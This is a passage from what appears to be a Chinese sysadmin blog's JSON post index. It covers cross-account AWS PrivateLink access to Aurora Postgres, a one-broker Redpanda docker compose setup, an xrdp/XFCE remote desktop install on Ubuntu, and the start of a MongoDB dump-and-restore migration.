id，也就是AWS_PROFILE中值中的那串数字\n这样另一个vpc域的所有资源都可以访问到这个endpoint service了\n之后还要在Endpoint connections 的 tab 页中批准新连接。\n同时把Service name给拷贝下来：com.amazonaws.vpce.ap-southeast-1.vpce-svc-11111111111\n二、左边的VPC中 1、建立Endpoint\n去到VPC，建endpoint，点击Create ednpoint新建\n名字：my-endpoint-postgres，选择类型是Endpoint services that use NLBs and GWLBs\n然后Service settings输入右边VPC 上 endpoint service 拷贝的service name，进行验证：com.amazonaws.vpce.ap-southeast-1.vpce-svc-11111111111\n然后就得去登录右边vpc的账号，在Endpoint connections中批准这个新连接。\n然后再返回来，选VPC，选子网，选SG。这里我们同样选私网的三个子网。SG同样是inbound是TCP 放行5432端口，没有就新建一个\n这样endpoint就建好了。查看它detail的tab页，拷贝下来DNS names\n2、测试\n我们在左边VPC的机器里起个shell，用dns name连接5432端口，测通即可\ntelnet vpce-xxxx.vpce-svc-xxxx.ap-southeast-1.vpce.amazonaws.com 5432 ","permalink":"https://rendoumi.com/posts/20250521-aws_endpoint/","summary":"\u003cp\u003e公司有两个AWS账号，有各自不同的 VPC 域。其中一个账号用到了 Aurora Postgres Serveless 的数据库。\u003c/p\u003e\n\u003cp\u003e现在另一个账号也需要用到posgres数据库，最直接的想法是在本域再搭一套postgres，或者ec2新加一台，上面安装posgres。\u003c/p\u003e\n\u003cp\u003e先去检查了一下已有的postgres serverless服务，结果使用率才23%，当下就直接想复用它了。\u003c/p\u003e\n\u003cp\u003e那能不能单独再开一个db，单独给第二个账号用呢，查了半天资料。可以的，但是吧，chatgpt真的是满嘴胡说八道，连带gemini也是。\u003c/p\u003e\n\u003cp\u003eaws家的东西都是开源经过魔改，跟网上占大多数的资料是不同的，这直接导致 chatgpt 按照网上大多数文档来进行推理，导致错误！！！\u003c/p\u003e\n\u003cp\u003e还有就是aws家的东西更新修改很快，最新的文档和之前的文档不同，也导致 chatpt 按照网上大多数的旧文档来进行推理，导致错误！！！\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100034306\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100034306.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个东西的架构图如上，右边的VPC里面连着 aurora 服务，它实际是target group的一个目标，然后上联到nlb，nlb再上联到endpoint service，对外提供服务.\u003c/p\u003e\n\u003cp\u003e然后左面VPC中建endpoint，通过PrivateLink连接到右边的EndpointService，这样通过私有的dns name和security group再进行控制，就可以直接连到右边的endpoint service服务资源了。\u003c/p\u003e\n\u003cp\u003e具体的做法步骤如下：\u003c/p\u003e\n\u003ch2 id=\"一第一步右边的vpc中\"\u003e一、第一步，右边的VPC中\u003c/h2\u003e\n\u003cp\u003e1、建立EndpointService\u003c/p\u003e\n\u003cp\u003e到VPC中，左边的Endpoint Services，点击：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521105156766\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521105156766.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击Create endpoint service新建一个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100551854\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100551854.png\"\u003e\u003c/p\u003e\n\u003cp\u003e名字：postgresql-serverless-endpoint-service，由于现在还没有nlb，需要再新建一个；点击Create new load balancer\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100641452\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100641452.png\"\u003e\u003c/p\u003e\n\u003cp\u003e2、建立nlb\u003c/p\u003e\n\u003cp\u003e点击：Create load balancer新建\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100713535\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100713535.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个类型，只能是nlb\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100748945\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100748945.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们这个nlb，不放在公网，不公开，所以选私有的Internal，只有IPV4，不提供IPV6.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521100909962\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521100909962.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网络选该VPC，子网选择三个private的子网\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101224868\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101224868.png\"\u003e\u003c/p\u003e\n\u003cp\u003eSecurity groups选择一下，这里rds-sg的inbound规则是允许TCP端口5432的进入，如果没有就新建一个SG\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101324400\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101324400.png\"\u003e\u003c/p\u003e\n\u003cp\u003e到最后了，居然还没有target group，那又要建一个了，点击Create target group建立\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101429096\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101429096.png\"\u003e\u003c/p\u003e\n\u003cp\u003e3、建立target group\u003c/p\u003e\n\u003cp\u003e名字叫做：postgres-target-group\u003c/p\u003e\n\u003cp\u003e我们选IP addresses，因为要连到后面的postgres服务\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101530207\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101530207.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后选好TCP，Port 5432， IPV4，VPC，其它保持缺省，然后建立\u003c/p\u003e","title":"AWS的跨账号访问不同VPC域中的服务"},{"content":"公司的一个公网要搬到内网的一个Rancher集群上，很繁琐\n原有的架构有kafka，要在内网复现一个出来\n那3节点的kafka和3节点的zookeeper，真的是不想搭啊\n搜啊搜啊搜啊搜，终于找到若干平替：\nRedis 的平替 Dragonfly Mongo 的平替 FerretDB Kafka 的平替 Redpanda 那就选定用Redpanda来搞，方法还是有一些曲折的：\nRedpanda 在 2025年5月16日这个节点，有5个版本\n最新的25.1的版本，如果用docker compose来启动，是个压缩包，好多文件。\n数据盘有三个了，而且用到了minio做后端的持久化卷，这么复杂，那不如直接搞Kafka了\n那只能往前回退，选用24.2的版本，docker compose 就一个文件，不过这个版本 2025年7月31日就终结支持了。\n下载的话：https://docs.redpanda.com/24.2/get-started/quick-start/\n我们要的是一个broker的，那直接给出源文件\nname: redpanda-quickstart-one-broker networks: redpanda_network: driver: bridge volumes: redpanda-0: null services: redpanda-0: command: - redpanda - start - --kafka-addr internal://0.0.0.0:9092,external://0.0.0.0:19092 # Address the broker advertises to clients that connect to the Kafka API. # Use the internal addresses to connect to the Redpanda brokers\u0026#39; # from inside the same Docker network. # Use the external addresses to connect to the Redpanda brokers\u0026#39; # from outside the Docker network. - --advertise-kafka-addr internal://redpanda-0:9092,external://localhost:19092 - --pandaproxy-addr internal://0.0.0.0:8082,external://0.0.0.0:18082 # Address the broker advertises to clients that connect to the HTTP Proxy. - --advertise-pandaproxy-addr internal://redpanda-0:8082,external://localhost:18082 - --schema-registry-addr internal://0.0.0.0:8081,external://0.0.0.0:18081 # Redpanda brokers use the RPC API to communicate with each other internally. - --rpc-addr redpanda-0:33145 - --advertise-rpc-addr redpanda-0:33145 # Mode dev-container uses well-known configuration properties for development in containers. - --mode dev-container # Tells Seastar (the framework Redpanda uses under the hood) to use 1 core on the system. - --smp 1 - --default-log-level=info image: docker.redpanda.com/redpandadata/redpanda:v25.1.4 container_name: redpanda-0 volumes: - redpanda-0:/var/lib/redpanda/data networks: - redpanda_network ports: - 18081:18081 - 18082:18082 - 19092:19092 - 19644:9644 console: container_name: redpanda-console image: docker.redpanda.com/redpandadata/console:v3.1.0 networks: - redpanda_network entrypoint: /bin/sh command: -c \u0026#39;echo \u0026#34;$$CONSOLE_CONFIG_FILE\u0026#34; \u0026gt; /tmp/config.yml; /app/console\u0026#39; environment: CONFIG_FILEPATH: /tmp/config.yml CONSOLE_CONFIG_FILE: | kafka: brokers: [\u0026#34;redpanda-0:9092\u0026#34;] schemaRegistry: enabled: true urls: [\u0026#34;http://redpanda-0:8081\u0026#34;] redpanda: adminApi: enabled: true urls: [\u0026#34;http://redpanda-0:9644\u0026#34;] ports: - 8080:8080 depends_on: - redpanda-0 仔细看了一下，这里面有问题，卷是空的，这可不行，必须持久化到本地，改一下\nvolumes: redpanda-0: driver: local driver_opts: type: none device: /data/redpanda/data o: bind 然后直接启动：\ndocker compose up -d 其实是启动了两个容器，一个数据端；一个是console，客户端\n我们打开8080 web的端口，那客户端呢，连的就是19092端口，用法跟kafka完全一样。\n","permalink":"https://rendoumi.com/posts/20250516-redpanda/","summary":"\u003cp\u003e公司的一个公网要搬到内网的一个Rancher集群上，很繁琐\u003c/p\u003e\n\u003cp\u003e原有的架构有kafka，要在内网复现一个出来\u003c/p\u003e\n\u003cp\u003e那3节点的kafka和3节点的zookeeper，真的是不想搭啊\u003c/p\u003e\n\u003cp\u003e搜啊搜啊搜啊搜，终于找到若干平替：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRedis 的平替 Dragonfly\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMongo 的平替 FerretDB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eKafka 的平替 Redpanda\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那就选定用\u003ccode\u003eRedpanda\u003c/code\u003e来搞，方法还是有一些曲折的：\u003c/p\u003e\n\u003cp\u003eRedpanda 在 2025年5月16日这个节点，有5个版本\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250516151644197\" loading=\"lazy\" src=\"/posts/20250516-redpanda/image-20250516151644197.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最新的25.1的版本，如果用docker compose来启动，是个压缩包，好多文件。\u003c/p\u003e\n\u003cp\u003e数据盘有三个了，而且用到了minio做后端的持久化卷，这么复杂，那不如直接搞Kafka了\u003c/p\u003e\n\u003cp\u003e那只能往前回退，选用24.2的版本，docker compose 就一个文件，不过这个版本 2025年7月31日就终结支持了。\u003c/p\u003e\n\u003cp\u003e下载的话：https://docs.redpanda.com/24.2/get-started/quick-start/\u003c/p\u003e\n\u003cp\u003e我们要的是一个broker的，那直接给出源文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ename: redpanda-quickstart-one-broker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetworks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  redpanda_network:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    driver: bridge\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evolumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  redpanda-0: null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  redpanda-0:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --kafka-addr internal://0.0.0.0:9092,external://0.0.0.0:19092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Address the broker advertises to clients that connect to the Kafka API.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Use the internal addresses to connect to the Redpanda brokers\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# from inside the same Docker network.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Use the external addresses to connect to the Redpanda brokers\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# from outside the Docker network.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --advertise-kafka-addr internal://redpanda-0:9092,external://localhost:19092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --pandaproxy-addr internal://0.0.0.0:8082,external://0.0.0.0:18082\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Address the broker advertises to clients that connect to the HTTP Proxy.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --advertise-pandaproxy-addr internal://redpanda-0:8082,external://localhost:18082\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --schema-registry-addr internal://0.0.0.0:8081,external://0.0.0.0:18081\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Redpanda brokers use the RPC API to communicate with each other internally.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --rpc-addr redpanda-0:33145\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --advertise-rpc-addr redpanda-0:33145\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Mode dev-container uses well-known configuration properties for development in containers.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --mode dev-container\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Tells Seastar (the framework Redpanda uses under the hood) to use 1 core on the system.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --smp \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --default-log-level\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: docker.redpanda.com/redpandadata/redpanda:v25.1.4\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: redpanda-0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda-0:/var/lib/redpanda/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    networks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda_network\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 18081:18081\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 18082:18082\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 19092:19092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 19644:9644\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  console:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: redpanda-console\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: docker.redpanda.com/redpandadata/console:v3.1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    networks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda_network\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    entrypoint: /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: -c \u003cspan class=\"s1\"\u003e\u0026#39;echo \u0026#34;$$CONSOLE_CONFIG_FILE\u0026#34; \u0026gt; /tmp/config.yml; /app/console\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      CONFIG_FILEPATH: /tmp/config.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      CONSOLE_CONFIG_FILE: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        kafka:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          brokers: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;redpanda-0:9092\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        schemaRegistry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          enabled: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          urls: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://redpanda-0:8081\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        redpanda:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          adminApi:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            enabled: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            urls: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://redpanda-0:9644\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 8080:8080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda-0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e仔细看了一下，这里面有问题，卷是空的，这可不行，必须持久化到本地，改一下\u003c/p\u003e","title":"kafka的测试替代品-redpanda"},{"content":"非常郁闷的一件事。公司的网络架构非常有意思，灵活性极大。导致我这个总在公司之外用openvpn连进去的人很痛苦，无法复现同事提出的问题。\n没办法，需要在公司网络内部有台测试机，那实际是有很多的，但都是debian或者ubuntu的，而问题偏偏是网页打不开的问题。\n那就干脆找一台Ubuntu，安装一下远程桌面，用RDP 3389连进去，启动一个Firefox，进行测试即可。\n步骤如下：\n一、升级ubuntu到最新\nsudo apt update sudo apt upgrade -y 二、安装xrdp\nsudo apt install xrdp -y 三、安装桌面环境xfce\nsudo apt install xfce4 xfce4-goodies -y 四、配置xfce使用xrdp\necho xfce4-session \u0026gt; ~/.xsession # 将最后一行替换掉 sudo vi /etc/xrdp/startwm.sh #exec /bin/sh /etc/X11/Xsession exec startxfce4 五、设置xrdp服务自启动\nsudo systemctl enable xrdp sudo systemctl start xrdp 六、如果有防火墙，记得放开3389的tcp端口\n七、把用户加入ssl-cert组\n# 这里我的登录用户是debian sudo adduser debian ssl-cert # 加组不用重启，如有其它改动需要重启 sudo systemctl restart xrdp 八、安装Firefox\nsudo apt install firefox-esr 九、开远程桌面，连上去，开个命令行执行firefox-esr\n","permalink":"https://rendoumi.com/posts/20250516-ubuntu_rdp/","summary":"\u003cp\u003e非常郁闷的一件事。公司的网络架构非常有意思，灵活性极大。导致我这个总在公司之外用\u003ccode\u003eopenvpn\u003c/code\u003e连进去的人很痛苦，无法复现同事提出的问题。\u003c/p\u003e\n\u003cp\u003e没办法，需要在公司网络内部有台测试机，那实际是有很多的，但都是debian或者ubuntu的，而问题偏偏是网页打不开的问题。\u003c/p\u003e\n\u003cp\u003e那就干脆找一台Ubuntu，安装一下远程桌面，用RDP 3389连进去，启动一个Firefox，进行测试即可。\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003cp\u003e一、升级ubuntu到最新\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt upgrade -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、安装xrdp\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install xrdp -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、安装桌面环境xfce\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install xfce4 xfce4-goodies -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e四、配置xfce使用xrdp\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e xfce4-session \u0026gt; ~/.xsession\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 将最后一行替换掉\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo vi /etc/xrdp/startwm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#exec /bin/sh /etc/X11/Xsession\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexec\u003c/span\u003e startxfce4\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20250516102445030\" loading=\"lazy\" src=\"/posts/20250516-ubuntu_rdp/image-20250516102445030.png\"\u003e\u003c/p\u003e\n\u003cp\u003e五、设置xrdp服务自启动\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e xrdp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl start xrdp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e六、如果有防火墙，记得放开3389的tcp端口\u003c/p\u003e\n\u003cp\u003e七、把用户加入ssl-cert组\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 这里我的登录用户是debian\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo adduser debian ssl-cert\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 加组不用重启，如有其它改动需要重启\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl restart xrdp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e八、安装Firefox\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install firefox-esr\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e九、开远程桌面，连上去，开个命令行执行\u003ccode\u003efirefox-esr\u003c/code\u003e\u003c/p\u003e","title":"Ubuntu 如何安装远程桌面RDP"},{"content":"要做一个mongodb集群的迁移和恢复，真是折腾死人了。记录并顺便吐槽一下：\nmongodb的tools真的是太简易、粗糙、丑陋了。\n线上的源数据库是腾讯的服务，要废弃搬迁到内网，足足折腾了一个星期。\n线上源数据库环境如下：\n云数据库 TencentDB 4C/8GB/500GB 3节点 于是在线下对等建立了mongo集群，同样配置，同样3节点。\n噩梦由此开始啊，注意线下集群的memory配置一定要高：\n32GB 用户名和密码一定要和线上完全一致 如果用户名密码不一致，Document恢复完毕，Index无法建立，因为是完全恢复，会覆盖admin这个db 然后开始dump线上数据\nmongodump -vvvvv --uri=\u0026#34;mongodb://root:xxxxxxxx@10.1.2.3:27017/?authSource=admin\u0026#34; 然后生成一个24G大小得dump文件夹，压缩后2.4G，传输到线下库上准备恢复\n# 大量恢复必须扩大文件句柄，否则过不去 ulimit -n 655360 # 一定要记录下来开始的时间戳，后面有用 date Sun May 11 06:34:02 PM CST 